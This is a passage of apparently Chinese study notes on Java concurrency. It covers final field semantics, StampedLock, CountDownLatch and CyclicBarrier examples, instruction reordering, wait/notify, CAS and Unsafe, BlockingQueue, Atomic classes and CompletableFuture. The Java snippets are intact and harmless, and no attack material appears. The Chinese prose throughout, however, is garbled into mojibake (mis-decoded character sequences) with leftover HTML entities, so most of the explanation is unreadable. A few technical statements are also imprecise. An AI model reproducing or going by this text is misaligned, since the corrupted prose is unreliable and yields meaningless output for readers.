//é”æ˜¯ä¸ºäº†å†…å­˜å¯è§æ€§ï¼Œè€Œä¸æ˜¯äº’æ–¥ try { int i = 0; try { for (E e : c) { checkNotNull(e); items[i++] = e; } } catch (ArrayIndexOutOfBoundsException ex) { throw new IllegalArgumentException(); } count = i; putIndex = (i == capacity) ? 0 : i; } finally { lock.unlock(); } } jvmåˆ›å»ºä¸€ä¸ªå¯¹è±¡åº”è¯¥åˆ†ä¸‰æ­¥ï¼Œmallocå†…å­˜(æŠŠæ‰€æœ‰å€¼è®¾ä¸º0,falseæˆ–è€…null)ï¼Œæ‰§è¡Œå¯¹è±¡çš„æ„é€ å‡½æ•°ï¼Œå°†è¯¥å¯¹è±¡çš„å¼•ç”¨èµ‹å€¼ç»™filedã€‚åä¸¤éƒ¨æ˜¯æœ‰å¯èƒ½é¡ºåºé¢ å€’çš„ï¼Œè¿™å°±å¯¼è‡´å¤šçº¿ç¨‹åœºæ™¯ä¸‹è¯»å–åˆ°ä¸€ä¸ªâ€œæ²¡æœ‰å®Œå…¨åˆå§‹åŒ–çš„â€å¯¹è±¡java language specification ä¸­ï¼ˆ17.5. final Field Semanticsï¼‰éƒ¨åˆ†æŒ‡å‡ºï¼Œå¯¹äºfinalçš„æˆå‘˜å˜é‡ï¼Œvmä¿è¯å¹¶å‘åœºæ™¯ä¸‹ä¸ä¼šå‘ç”Ÿæ„é€ å‡½æ•°æŒ‡ä»¤é‡æ’ class FinalFieldExample { final int x; int y; static FinalFieldExample f; public FinalFieldExample() { x = 3; y = 4; } static void writer() { f = new FinalFieldExample(); } static void reader() { if (f != null) { int i = f.x; // guaranteed to see 3 //finalå˜é‡ä¿è¯ä¼šè¢«åˆå§‹åŒ– int j = f.y; // could see 0 //æ™®é€šå˜é‡ä¸ä¿è¯ } } } 5.ReentrantLock ä¸å…¬å¹³é”åœ¨jdk1.5é‡Œé¢ï¼ŒReentrantLockçš„æ€§èƒ½æ˜¯æ˜æ˜¾ä¼˜äºsynchronizedçš„ï¼Œä½†æ˜¯åœ¨jdk1.6é‡Œé¢ï¼Œsynchronizedåšäº†ä¼˜åŒ–ï¼Œä»–ä»¬ä¹‹é—´çš„æ€§èƒ½å·®åˆ«å·²ç»ä¸æ˜æ˜¾äº†ã€‚ 6. StampedLocks(java 8)java 1.5 å°±æœ‰äº†ReentrantReadWriteLockï¼Œç”¨äºå®ç°ä¸“é—¨é’ˆå¯¹è¯»æˆ–è€…å†™çš„lockjava 8æä¾›äº†StampedLocks,lockæ–¹æ³•è¿”å›ä¸€ä¸ªlongçš„æ—¶é—´æˆ³ï¼Œå¯ä»¥ç”¨è¿™ä¸ªæ—¶é—´æˆ³release lockï¼Œæˆ–è€…æ£€æµ‹lockæ˜¯å¦æœ‰æ•ˆã€‚ä¾‹å¦‚ï¼ŒtryConvertToOptimisticRead,å‡å¦‚åœ¨è¿™ä¸ªè¯»çš„æ—¶é—´æ®µå†…æœªå‘ç”Ÿå…¶ä»–çº¿ç¨‹çš„å†™æ“ä½œï¼Œå¯ä»¥è®¤ä¸ºæ•°æ®æ˜¯æœ‰æ•ˆçš„ã€‚åƒè¿™æ · å‡å¦‚æœ‰çº¿ç¨‹é€šè¿‡lock.writeLock()è·å¾—äº†å†™é”ï¼Œåªè¦ä¸unlockWriteï¼Œæ‰€æœ‰çš„è°ƒç”¨lock.readLockæˆ–è€…tryConvertToOptimisticReadéƒ½ä¸ä¼šæˆåŠŸã€‚ å‡å¦‚æœ‰çº¿ç¨‹è·å–äº†è¯»é”ï¼Œå³è°ƒç”¨äº†lock.readLock()ï¼Œæˆ–è€…tryReadLockè·å¾—è¯»å–é”ã€‚è¯»å–è·å–é”å¹¶ä¸æ˜¯åŠ é”ï¼Œè¯»å¹¶ä¸æ˜¯å±é™©æ“ä½œï¼Œè·å–é”åªæ˜¯ä¸ºäº†æ£€æµ‹è¯»å–çš„è¿‡ç¨‹ä¸­æ˜¯å¦å‘ç”Ÿè¿‡å†™ Optimistic Reading ï¼Œå³tryConvertToOptimisticRead,åªæœ‰åœ¨å½“å‰é”ä¸è¢«å†™æŒæœ‰çš„æ—¶å€™æ‰è¿”å›ä¸€ä¸ªéé›¶å€¼ï¼Œè¿™ä¸ªå€¼ç”¨äºåœ¨è¯»å–å®Œæ¯•ä¹‹åç”¨validateæ£€æµ‹æœ¬æ¬¡è¯»å–çš„é—´éš™ä¸­æ˜¯å¦å‘ç”Ÿè¿‡å†™æ“ä½œã€‚ 7. Androidå®˜æ–¹æ–‡æ¡£ä¸Šå¯¹äºhappens-beforeçš„å‡†åˆ™æœ‰è¯¦ç»†çš„æè¿°happens-beforeï¼Œä¸»è¦æ˜¯jdkæœ¬èº«æä¾›çš„primitiveéµå®ˆçš„å¹¶å‘å‡†åˆ™ã€‚ 8. lockçš„å£°æ˜æ–¹å¼ä¸€èˆ¬synchronize(object)å°±å¥½äº†,ä½†æœ‰æ›´ç»æµçš„æ–¹å¼ Object lock = new Object(); private byte[] lock = new byte[0]; // ç‰¹æ®Šçš„instanceå˜é‡ Public void methodA() { synchronized(lock) { //â€¦ } } é›¶é•¿åº¦çš„byteæ•°ç»„å¯¹è±¡åˆ›å»ºèµ·æ¥å°†æ¯”ä»»ä½•å¯¹è±¡éƒ½ç»æµâ€•â€•æŸ¥çœ‹ç¼–è¯‘åçš„å­—èŠ‚ç ï¼šç”Ÿæˆé›¶é•¿åº¦çš„byte[]å¯¹è±¡åªéœ€3æ¡æ“ä½œç ï¼Œè€Œ Object lock = new Object() ;åˆ™éœ€è¦7è¡Œæ“ä½œç ã€‚ 9. CountdownLatchå’ŒCyclicBarrieråˆ†åˆ«ä¸¾ä¸€ä¸ªä¾‹å­ public class CountDownLatchTest { private int threadNum = 5;//æ‰§è¡Œä»»åŠ¡çš„å­çº¿ç¨‹æ•°é‡ private int workNum = 20;//ä»»åŠ¡æ•°é‡ private ExecutorService service; private ArrayBlockingQueue&lt;String&gt; blockingQueue; private CountDownLatch latch; @Before public void setUp() { service = Executors.newFixedThreadPool(threadNum, new ThreadFactoryBuilder().setNameFormat(&quot;WorkThread-%d&quot;).build()); blockingQueue = new ArrayBlockingQueue&lt;&gt;(workNum); for (int i = 0; i &lt; workNum; i++) { blockingQueue.add(&quot;ä»»åŠ¡-&quot; + i); } latch = new CountDownLatch(workNum);//è®¡æ•°å™¨çš„å€¼ä¸ºä»»åŠ¡çš„æ•°é‡ } @Test public void test() throws InterruptedException { SoutUtil.print(&quot;ä¸»çº¿ç¨‹å¼€å§‹è¿è¡Œ&quot;); for (int i = 0; i &lt; workNum; i++) { service.execute(new WorkRunnable()); } latch.await();//ç­‰å¾…å­çº¿ç¨‹çš„æ‰€æœ‰ä»»åŠ¡å®Œæˆ SoutUtil.print(&quot;ä¸»çº¿ç¨‹å»åšå…¶å®ƒäº‹&quot;); } //ç”¨blockQueueä¸­çš„å…ƒç´ æ¨¡æ‹Ÿä»»åŠ¡ public String getWork() { return blockingQueue.poll(); } class WorkRunnable implements Runnable { public void run() { String work = getWork(); performWork(work); latch.countDown();//å®Œæˆä¸€ä¸ªä»»åŠ¡å°±è°ƒç”¨ä¸€æ¬¡ } } private void performWork(String work) { SoutUtil.print(&quot;å¤„ç†ä»»åŠ¡ï¼š&quot; + work); try { //æ¨¡æ‹Ÿè€—æ—¶çš„ä»»åŠ¡ Thread.currentThread().sleep(60); } catch (InterruptedException e) { e.printStackTrace(); } } } CountDownLatchçš„awaitæ–¹æ³•ä¼šé˜»å¡ä¸»çº¿ç¨‹ç›´åˆ°Nå‡å°‘åˆ°0ã€‚ CyclicBarrierçš„ä¾‹å­ public class CyclicBarrierDemo { public static void main(String[] args) { int totalThread = 5; CyclicBarrier barrier = new CyclicBarrier(totalThread); for(int i = 0; i &lt; totalThread; i++) { String threadName = &quot;Thread &quot; + i; new Thread(() -&gt; { System.out.println(String.format(&quot;%s\\t%s %s&quot;, new Date(), threadName, &quot; is waiting&quot;)); try { barrier.await();// å¿…é¡»ç­‰æ‰€æœ‰çº¿ç¨‹å®Œæˆäº†ä¸Šé¢çš„æ“ä½œï¼Œåé¢çš„æ“ä½œæ‰èƒ½æ‰§è¡Œã€‚ } catch (Exception ex) { ex.printStackTrace(); } System.out.println(String.format(&quot;%s\\t%s %s&quot;, new Date(), threadName, &quot;ended&quot;)); }).start(); } } } CyclicBarrieræ˜¯ç­‰å¤§å®¶éƒ½è°ƒå®Œawaitä¹‹åæ‰å¼€å§‹å„è‡ªèµ°ä¸‹ä¸€æ­¥ CyclicBarrierå’ŒCountDownLatchçš„åŸç†ç®€è¿°CountDownLatchï¼šä¸€ä¸ªæˆ–è€…å¤šä¸ªçº¿ç¨‹ï¼Œç­‰å¾…å…¶ä»–å¤šä¸ªçº¿ç¨‹å®ŒæˆæŸä»¶äº‹æƒ…ä¹‹åæ‰èƒ½æ‰§è¡Œï¼›CountDownLatch çš„åŸç†ï¼šAQS å…±äº«æ¨¡å¼çš„å…¸å‹ä½¿ç”¨ï¼Œæ„é€ å‡½æ•°ä¸­çš„ 1 æ˜¯è®¾ç½®ç»™ AQS çš„ state çš„ã€‚latch.await() æ–¹æ³•ä¼šé˜»å¡ï¼Œè€Œ latch.countDown() æ–¹æ³•å°±æ˜¯ç”¨æ¥å°† stateâ€“ çš„ï¼Œå‡åˆ° 0 ä»¥åï¼Œå”¤é†’æ‰€æœ‰çš„é˜»å¡åœ¨ await() æ–¹æ³•ä¸Šçš„çº¿ç¨‹ã€‚CyclicBarrierï¼šå¤šä¸ªçº¿ç¨‹äº’ç›¸ç­‰å¾…ï¼Œç›´åˆ°åˆ°è¾¾åŒä¸€ä¸ªåŒæ­¥ç‚¹ï¼Œå†ç»§ç»­ä¸€èµ·æ‰§è¡Œã€‚CyclicBarrier çš„åŸç†ä¸æ˜¯ AQS çš„å…±äº«æ¨¡å¼ï¼Œæ˜¯ AQS Condition å’Œ ReentrantLock çš„ç»“åˆä½¿ç”¨ 10.æŒ‡ä»¤é‡æ’ä¸æ˜¯è¯´è¯´è€Œå·² åœ¨å¤šçº¿ç¨‹çš„åœºæ™¯ä¸‹ï¼Œæ— é€»è¾‘ç›¸å…³çš„ä»£ç å†™çš„å‰åé¡ºåºå¹¶æ— æ„ä¹‰ï¼ŒåŸå› æ˜¯ç¼–è¯‘å™¨ä¼šè¿›è¡ŒæŒ‡ä»¤é‡æ’ã€‚ä¸ºä»€ä¹ˆè¯´æŒ‡ä»¤é‡æ’åºä¼šå½±å“ items çš„å¯è§æ€§å‘¢ï¼Ÿåˆ›å»ºä¸€ä¸ªå¯¹è±¡è¦åˆ†ä¸ºä¸‰ä¸ªæ­¥éª¤ï¼š 1 åˆ†é…å†…å­˜ç©ºé—´ 2 åˆå§‹åŒ–å¯¹è±¡ 3 å°†å†…å­˜ç©ºé—´çš„åœ°å€èµ‹å€¼ç»™å¯¹åº”çš„å¼•ç”¨ ä½†æ˜¯ç”±äºæŒ‡ä»¤é‡æ’åºçš„é—®é¢˜ï¼Œæ­¥éª¤ 2 å’Œæ­¥éª¤ 3 æ˜¯å¯èƒ½å‘ç”Ÿé‡æ’åºçš„ï¼Œå¦‚ä¸‹ï¼š 1 åˆ†é…å†…å­˜ç©ºé—´ 2 å°†å†…å­˜ç©ºé—´çš„åœ°å€èµ‹å€¼ç»™å¯¹åº”çš„å¼•ç”¨ 3 åˆå§‹åŒ–å¯¹è±¡ è¿™ä¹Ÿå°±è§£é‡Šäº†æˆ‘ä»¬å¹³æ—¶æ˜¯å¦‚ä½•æ­£ç¡®åœ°å†™å‡ºå•ä¾‹æ¨¡å¼ volatile åœ¨Javaä¸­ä¸€ä¸ªç‰¹æ€§æ˜¯ä¿è¯å¯è§æ€§ï¼Œå¦ä¸€ä¸ªæ˜¯ç¦æ­¢æŒ‡ä»¤é‡æ’åºä¼˜åŒ–ã€‚ 11.HashMapä¸æ˜¯çº¿ç¨‹å®‰å…¨çš„ï¼Œå¯èƒ½ä¼šåœ¨reHashé‡Œå½¢æˆæ­»é”éå¸¸çƒ§è„‘ 12. waitå’Œnotifyæ­é…ä½¿ç”¨ï¼Œsleepæ˜¯ä¸é‡Šæ”¾é”çš„è½¬è‡ªsleepå’Œwaitåˆ°åº•ä»€ä¹ˆåŒºåˆ«waitæ˜¯åœ¨å½“å‰çº¿ç¨‹æŒæœ‰waitå¯¹è±¡é”çš„æƒ…å†µä¸‹ï¼Œæš‚æ—¶æ”¾å¼ƒé”ï¼Œå¹¶è®©å‡ºCPUèµ„æºï¼Œå¹¶ç§¯æç­‰å¾…å…¶å®ƒçº¿ç¨‹è°ƒç”¨åŒä¸€å¯¹è±¡çš„notifyæˆ–è€…notifyAllæ–¹æ³•ã€‚æ³¨æ„ï¼Œå³ä½¿åªæœ‰ä¸€ä¸ªçº¿ç¨‹åœ¨ç­‰å¾…ï¼Œå¹¶ä¸”æœ‰å…¶å®ƒçº¿ç¨‹è°ƒç”¨äº†notifyæˆ–è€…notifyAllæ–¹æ³•ï¼Œç­‰å¾…çš„çº¿ç¨‹åªæ˜¯è¢«æ¿€æ´»ï¼Œä½†æ˜¯å®ƒå¿…é¡»å¾—å†æ¬¡è·å¾—é”æ‰èƒ½ç»§ç»­å¾€ä¸‹æ‰§è¡Œã€‚æ¢è¨€ä¹‹ï¼Œå³ä½¿notifyè¢«è°ƒç”¨ï¼Œä½†åªè¦é”æ²¡æœ‰è¢«é‡Šæ”¾ï¼ŒåŸç­‰å¾…çº¿ç¨‹å› ä¸ºæœªè·å¾—é”ä»ç„¶æ— æ³•ç»§ç»­æ‰§è¡Œã€‚ waitå’Œnotifyéƒ½å¿…é¡»åŒ…åœ¨synchronizedä»£ç å—ä¸­ï¼ˆå¿…é¡»åœ¨è·å¾—é”çš„å‰æä¸‹è°ƒç”¨ï¼‰ Sleepæ˜¯Threadå¯¹è±¡çš„é™æ€æ–¹æ³•ï¼Œsleepå¹¶ä¸é‡Šæ”¾é”ï¼Œä¹Ÿä¸è¦æ±‚æŒæœ‰é”ã€‚ Thread.yieldæ–¹æ³•æ˜¯è®©å½“å‰çº¿ç¨‹ä»æ‰§è¡ŒçŠ¶æ€å˜æˆå°±ç»ªçŠ¶æ€ï¼ˆå°±æ˜¯å’Œå¤§å®¶ä¸€èµ·æŠ¢ï¼‰ synchronizedå…³é”®å­—ä¸€èˆ¬æœ‰ä¸‰ç§ç”¨æ³• ä¸€ã€å®ä¾‹åŒæ­¥æ–¹æ³•synchronizedç”¨äºä¿®é¥°å®ä¾‹æ–¹æ³•ï¼ˆéé™æ€æ–¹æ³•ï¼‰æ—¶ï¼Œæ‰§è¡Œè¯¥æ–¹æ³•éœ€è¦è·å¾—çš„æ˜¯è¯¥ç±»å®ä¾‹å¯¹è±¡çš„å†…ç½®é”ï¼ˆåŒä¸€ä¸ªç±»çš„ä¸åŒå®ä¾‹æ‹¥æœ‰ä¸åŒçš„å†…ç½®é”ï¼‰ã€‚å¦‚æœå¤šä¸ªå®ä¾‹æ–¹æ³•éƒ½è¢«synchronizedä¿®é¥°ï¼Œåˆ™å½“å¤šä¸ªçº¿ç¨‹è°ƒç”¨åŒä¸€å®ä¾‹çš„ä¸åŒåŒæ­¥æ–¹æ³•ï¼ˆæˆ–è€…åŒä¸€æ–¹æ³•ï¼‰æ—¶ï¼Œéœ€è¦ç«äº‰é”ã€‚ä½†å½“è°ƒç”¨çš„æ˜¯ä¸åŒå®ä¾‹çš„æ–¹æ³•æ—¶ï¼Œå¹¶ä¸éœ€è¦ç«äº‰é”ã€‚ä¹Ÿæ­£æ˜¯å¦‚æ­¤ï¼Œä¸€ä¸ªåŒæ­¥æ–¹æ³•è¢«è°ƒç”¨æ—¶ï¼Œå°±ç­‰äºç‹¬å äº†å½“å‰å®ä¾‹çš„é”ï¼Œå…¶ä»–çº¿ç¨‹æ— æ³•è°ƒç”¨å½“å‰å®ä¾‹çš„å…¶ä»–åŒæ­¥æ–¹æ³•ã€‚æ‰€ä»¥ä¸æ˜¯å¾ˆæ¨èä½¿ç”¨åŒæ­¥æ–¹æ³•ã€‚äºŒã€é™æ€åŒæ­¥æ–¹æ³•synchronizedç”¨äºä¿®é¥°é™æ€æ–¹æ³•æ—¶ï¼Œæ‰§è¡Œè¯¥æ–¹æ³•éœ€è¦è·å¾—çš„æ˜¯è¯¥ç±»çš„classå¯¹è±¡çš„å†…ç½®é”ï¼ˆä¸€ä¸ªç±»åªæœ‰å”¯ä¸€ä¸€ä¸ªclasså¯¹è±¡ï¼‰ã€‚è°ƒç”¨åŒä¸€ä¸ªç±»çš„ä¸åŒé™æ€åŒæ­¥æ–¹æ³•æ—¶ä¼šäº§ç”Ÿé”ç«äº‰ã€‚ä¸‰ã€åŒæ­¥ä»£ç å—synchronizedç”¨äºä¿®é¥°ä»£ç å—æ—¶ï¼Œè¿›å…¥åŒæ­¥ä»£ç å—éœ€è¦è·å¾—synchronizedå…³é”®å­—åé¢æ‹¬å·å†…çš„å¯¹è±¡ï¼ˆå¯ä»¥æ˜¯å®ä¾‹å¯¹è±¡ä¹Ÿå¯ä»¥æ˜¯classå¯¹è±¡ï¼‰çš„å†…ç½®é”ã€‚ java ioä¸­çš„InputStreamçš„readæ–¹æ³•å’ŒOutputStreamçš„writeæ–¹æ³•éƒ½æ˜¯åŠ äº†synchronizedçš„ã€‚è€ŒOkioé‡Œé¢synchronizedæ–¹æ³•æˆ‘æ²¡æ‰¾åˆ°ï¼Œå¦å¤–ï¼ŒçœŸçš„æƒ³è¦ioæ€§èƒ½çš„è¯ï¼Œç”¨nioã€‚ åŒæ­¥ä¸€ä¸ªå¯¹è±¡çš„å‰ææ˜¯å„æ–¹éƒ½åŒæ„ä½¿ç”¨åŒä¸€æŠŠé”ä½œä¸ºè°ƒç”¨æ–¹æ³•çš„å‰æï¼Œå•æ–¹é¢åŠ é”å¹¶ä¸é™åˆ¶ä¸å°Šé‡é”æœºåˆ¶çš„ä½¿ç”¨è€…ã€‚ä¸¤æ¡çº¿ç¨‹åˆ†åˆ«å»å–ä¸¤ä¸ªäº’ä¸ç›¸å¹²çš„é”ï¼Œè¿™é‡Œé¢å½“ç„¶ä¸å­˜åœ¨é˜»å¡é—®é¢˜ã€‚ 13. CASæ“ä½œæ˜¯æœ‰æ“ä½œç³»ç»Ÿæä¾›äº†ç¡¬ä»¶çº§åˆ«çš„åŸå­æ“ä½œçš„ã€‚CASå±äºä¹è§‚çš„ä¸€ç§ï¼Œå‡å¦‚æ¯”è¾ƒä¹‹åå‘ç°OKé‚£æœ€å¥½ï¼Œå‡å¦‚ä¸æˆåŠŸè¿˜å…è®¸ç»§ç»­å°è¯•ã€‚jdkä¸­ä½¿ç”¨çš„æ˜¯UnSafeè¿™ä¸ªç±»ï¼Œè¿™ä¸ªç±»å±äºâ€œåé—¨â€ï¼Œå¼€å‘è€…å¯ä»¥ä½¿ç”¨è¿™ä¸ªç±»ç›´æ¥æ“æ§HotSpot jvmå†…å­˜å’Œçº¿ç¨‹ã€‚è¢«å¹¿æ³›åº”ç”¨äºjucåŒ…ä¸­ã€‚ æ¯”å¦‚è¯´ç›´æ¥æ“çºµå†…å­˜ Unsafe unsafe = getUnsafe(); Class aClass = A.class; A a = (A) unsafe.allocateInstance(aClass); éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œæƒ³è¦è·å¾—ä¸€ä¸ªUnSafeçš„å®ä¾‹ä¸æ˜¯è¿™ä¹ˆå¹²çš„ Unsafe unsafe = Unsafe.getUnsafe(); // this will crash, jdkå†…éƒ¨çš„ä¸€äº›classå¯ä»¥è¿™ä¹ˆå¹² æƒ³è¦è·å¾—ä¸€ä¸ªunsafeçš„å®ä¾‹å¯ä»¥è¿™ä¹ˆå¹² Field f = Unsafe.class.getDeclaredField(&quot;theUnsafe&quot;); f.setAccessible(true); Unsafe unsafe = (Unsafe) f.get(null); æœ€å¥½ä¸è¦åœ¨å·¥ç¨‹ä¸­ä½¿ç”¨ï¼Œè¿™æ ·çš„åšæ³•åœ¨jsonåº“ä¸­å¾€å¾€è¢«ä½œä¸ºä¸€ç§ä¿åº•çš„æ–¹æ³•ï¼Œæ³¨æ„è¿™ç§æ–¹å¼åˆ›å»ºçš„å¯¹è±¡æ˜¯æ²¡æœ‰åˆå§‹åŒ–çš„ï¼ˆæ²¡æœ‰è°ƒç”¨æ„é€ å‡½æ•°ï¼‰ 14.ArrayBlockingQueueå’ŒLinkedBlockingQueueçº¿ç¨‹æ± çš„æ„é€ æ–¹æ³•æœ€åä¸€ä¸ªå‚æ•°æ˜¯ä¸€ä¸ªBlockingQueueï¼ŒBlockingQueueæ˜¯ä¸€ä¸ªæ¥å£ï¼Œå°±åƒä¸€ä¸ªå…¸å‹çš„ç”Ÿäº§è€…æ¶ˆè´¹è€…æ¨¡å‹é—®é¢˜ä¸€æ ·ã€‚å¦‚æœä»queueä¸­å–elementçš„æ—¶å€™å‘ç°sizeä¸º0ï¼Œæˆ–è€…å¾€queueä¸­æ·»åŠ elementçš„æ—¶å€™å‘ç°queueæ»¡äº†ã€‚åº”å¯¹è¿™ç§èµ„æºä¸èƒ½è¢« ç«‹å³æ»¡è¶³ çš„ç­–ç•¥å°±å®šä¹‰äº†BlockingQueueã€‚BlockingQueueæä¾›äº†å››ç§åº”å¯¹ç­–ç•¥æ¥å¤„ç†è¿™ç§èµ„æºä¸èƒ½è¢«ç«‹å³satisfyçš„åœºæ™¯ ç©ºå€¼ æŠ›å‡ºå¼‚å¸¸ è¿”å›ä¸€ä¸ªç‰¹æ®Šå€¼ é˜»å¡ è°ƒç”¨è€…æä¾›ä¸€ä¸ªè¶…æ—¶ æ’å…¥ add(e) offer(e) put(e) put(e, time ,timeUnit) ç§»é™¤ remove() poll() take() poll(time,timeUnit) æ£€æŸ¥ element() peek() ä¸å¯ç”¨ ä¸å¯ç”¨ æ–‡æ¡£ä¸Šè¯´ï¼š Usage example, based on a typical producer-consumer scenario. Note that a BlockingQueue can safely be used with multiple producers and multiple consumers.ï¼ˆBlockingQueueèƒ½å¤Ÿå®‰å…¨çš„ç”¨äºå¤šä¸ªç”Ÿäº§è€…æ¶ˆè´¹è€…çš„åœºæ™¯ï¼Œå°±æ˜¯è¯´è¿™ä¸ªå®¹å™¨å·²ç»å¸®å¤–éƒ¨å¤„ç†å¥½äº†ç”Ÿäº§å’Œæ¶ˆè´¹å¹¶å‘çš„åŒæ­¥é—®é¢˜ï¼Œå…¶å®å°±æ˜¯åŠ é”ï¼‰ BlockingQueueçš„å¸¸ç”¨çš„å®ç°ç±»åŒ…æ‹¬ArrayBlockingQueue(FIFO)å’ŒLinkedBlockingQueue(FIFO)ã€‚ 15. AtomicXXXåªæ˜¯å°†valueå†™æˆvolatileï¼Œè¿™æ ·getå°±å®‰å…¨äº†ï¼Œsetçš„è¯ç›´æ¥äº¤ç»™Unsafeäº†volatileå¹¶ä¸æ˜¯Atomicæ“ä½œï¼Œä¾‹å¦‚ï¼ŒAçº¿ç¨‹å¯¹volatileå˜é‡è¿›è¡Œå†™æ“ä½œ(å®é™…ä¸Šæ˜¯è¯»å’Œå†™æ“ä½œ)ï¼ŒBçº¿ç¨‹å¯èƒ½åœ¨è¿™ä¸¤ä¸ªæ“ä½œä¹‹é—´è¿›è¡Œäº†å†™æ“ä½œï¼›ä¾‹å¦‚ç”¨volatileä¿®é¥°countå˜é‡é‚£ä¹ˆ count++ æ“ä½œå°±ä¸æ˜¯åŸå­æ€§çš„ã€‚è€ŒAtomicIntegerç±»æä¾›çš„atomicæ–¹æ³•å¯ä»¥è®©è¿™ç§æ“ä½œå…·æœ‰åŸå­æ€§å¦‚getAndIncrement()æ–¹æ³•ä¼šåŸå­æ€§çš„è¿›è¡Œå¢é‡æ“ä½œæŠŠå½“å‰å€¼åŠ ä¸€,å› ä¸ºAtomicIntegerçš„getAndIncrementæ–¹æ³•å°±æ˜¯ç®€å•çš„è°ƒç”¨äº†Unsafeçš„getAndAddIntã€‚ CASè¿˜æ˜¯ä¸èƒ½è§£å†³ABAé—®é¢˜ åœ¨javaä¸­ç”¨AtomicStampedReferenceå°±å¯ä»¥äº† ABAé—®é¢˜ç®€å•è¯´å°±æ˜¯ä¸¤æ¡çº¿ç¨‹1,2åŒæ—¶æƒ³æŠŠ100æ”¹æˆ50ï¼Œè¿™æ—¶1ç”¨CASæ”¹å¥½äº†ï¼Œ2å› ä¸ºæŸäº›é—®é¢˜å µä½äº†ï¼Œæ°å¥½è¿™ä¸ªæ—¶å€™3çº¿ç¨‹è·‘è¿›æ¥æŠŠ50æ”¹æˆäº†100ï¼Œè¿™ä¹‹å2ç»“æŸå µå¡ï¼Œç”¨CASæ¯”è¾ƒï¼Œå—¯ï¼Œé¢„æœŸæ˜¯100ï¼Œæ²¡é”™ï¼Œç›´æ¥CASå˜æˆ50.ï¼ˆç„¶è€Œæ­£å¸¸æƒ…å†µä¸‹ç»“æœåº”è¯¥æ˜¯100ï¼Œä¹Ÿå°±æ˜¯è¯´å‡æ³•æ“ä½œåšäº†ä¸¤æ¬¡ï¼‰ java.util.concurrent.atomicä¸‹åŒ…æ‹¬AtomicBooleanã€AtomicIntegerâ€¦è¿˜æœ‰AtomicLongFiledUpdater 16. è¯»å¤šå†™å°‘çš„åœºæ™¯ä¸‹çš„åŒæ­¥ CopyOnWriteArrayListå’ŒCollections.synchronizedListç›¸æ¯”ã€‚åœ¨é«˜å¹¶å‘å‰æä¸‹ï¼Œå‰è€…è¯»çš„æ€§èƒ½æ›´å¥½ï¼Œåè€…å†™çš„æ€§èƒ½æ›´å¥½(å‰è€…çš„å†™æ€§èƒ½æå·®)ã€‚CopyOnWriteArrayListä¸Collections.synchronizedListçš„æ€§èƒ½å¯¹æ¯”ã€‚CopyOnWriteArrayListé€‚åˆåšç¼“å­˜ã€‚ ReentrantReadWriteLock ç”¨äºé’ˆå¯¹è¯»å¤šå†™å°‘çš„åœºæ™¯è¿›è¡Œä¼˜åŒ–ã€‚ï¼ˆè·å¾—è¯»é”åï¼Œå…¶å®ƒçº¿ç¨‹å¯è·å¾—è¯»é”è€Œä¸èƒ½è·å–å†™é” è·å¾—å†™é”åï¼Œå…¶å®ƒçº¿ç¨‹æ—¢ä¸èƒ½è·å¾—è¯»é”ä¹Ÿä¸èƒ½è·å¾—å†™é”ï¼‰ java æ— é”çŠ¶æ€ã€åå‘é”ã€è½»é‡çº§é”å’Œé‡é‡çº§é” 17. CompletableFutureç­‰java 8 çš„apiCompletableFutureçš„ä¸€ä¸ªå¥½å¤„æ˜¯å¯ä»¥å°†äº‹ä»¶å¤„ç†ä¸²èµ·æ¥ï¼Œå†™èµ·æ¥è·Ÿrxjavaé‚£ä¸€å¥—æœ‰ç‚¹åƒã€‚thenApply()å’ŒthenCompose()çš„åŒºåˆ«ï¼šthenApply()è½¬æ¢çš„æ˜¯æ³›å‹ä¸­çš„ç±»å‹ï¼Œæ˜¯åŒä¸€ä¸ªCompletableFutureï¼›thenCompose()ç”¨æ¥è¿æ¥ä¸¤ä¸ªCompletableFutureï¼Œæ˜¯ç”Ÿæˆä¸€ä¸ªæ–°çš„CompletableFutureã€‚åè°ƒå¤šä¸ªäº‹ä»¶åŒæ­¥ CompletableFuture&lt;String&gt; future1 = CompletableFuture.supplyAsync(() -&gt; &quot;Hello&quot;); CompletableFuture&lt;String&gt; future2 = CompletableFuture.supplyAsync(() -&gt; &quot;Beautiful&quot;); CompletableFuture&lt;String&gt; future3 = CompletableFuture.supplyAsync(() -&gt; &quot;World&quot;); CompletableFuture&lt;Void&gt; combinedFuture = CompletableFuture.allOf(future1, future2, future3); combinedFuture.get(); AtomicLongFieldUpdateræ¯”AtomicLongæ›´åŠ çœå†…å­˜çš„æ–¹å¼ 18.ScheduledThreadPoolExecutorç”¨äºå®šæœŸæ‰§è¡Œä»»åŠ¡é¦–å…ˆè¦çŸ¥é“çš„æ˜¯æ—©æœŸï¼ˆjdk1.5ä¹‹å‰ï¼‰å¯ä»¥ä½¿ç”¨TimerTaskå»å®šæœŸæ‰§è¡Œä»»åŠ¡ï¼Œä½†æ˜¯å› ä¸ºå…¶å†…éƒ¨å®ç°æ˜¯åªæœ‰ä¸€æ¡çº¿ç¨‹ï¼Œæ‰€ä»¥éš¾å…ä¼šå› ä¸ºå‰é¢å µå¡è€Œè¾¾ä¸åˆ°å‡†æ—¶ã€‚ScheduledThreadPoolExecutorå¯ä»¥è§£å†³è¿™ä¸ªé—®é¢˜ï¼Œä¸»è¦æ˜¯scheduleAtFixedRateå’ŒscheduleWithFixedDelayè¿™ä¸¤ä¸ªapi ScheduledThreadPoolExecutorä½œä¸ºçº¿ç¨‹æ± ï¼Œå†…éƒ¨çš„blockingQueueä½¿ç”¨çš„æ˜¯DelayedWorkQueue.DelayedWorkQueueä¸ºScheduledThreadPoolExecutorä¸­çš„å†…éƒ¨ç±»ï¼Œå®ƒå…¶å®å’Œé˜»å¡é˜Ÿåˆ—DelayQueueæœ‰ç‚¹å„¿ç±»ä¼¼ã€‚DelayQueueæ˜¯å¯ä»¥æä¾›å»¶è¿Ÿçš„é˜»å¡é˜Ÿåˆ—ï¼Œå®ƒåªæœ‰åœ¨å»¶è¿ŸæœŸæ»¡æ—¶æ‰èƒ½ä»ä¸­æå–å…ƒç´ ï¼Œå…¶åˆ—å¤´æ˜¯å»¶è¿ŸæœŸæ»¡åä¿å­˜æ—¶é—´æœ€é•¿çš„Delayedå…ƒç´ ã€‚å¦‚æœå»¶è¿Ÿéƒ½è¿˜æ²¡æœ‰æœŸæ»¡ï¼Œåˆ™é˜Ÿåˆ—æ²¡æœ‰å¤´éƒ¨ï¼Œå¹¶ä¸” poll å°†è¿”å› 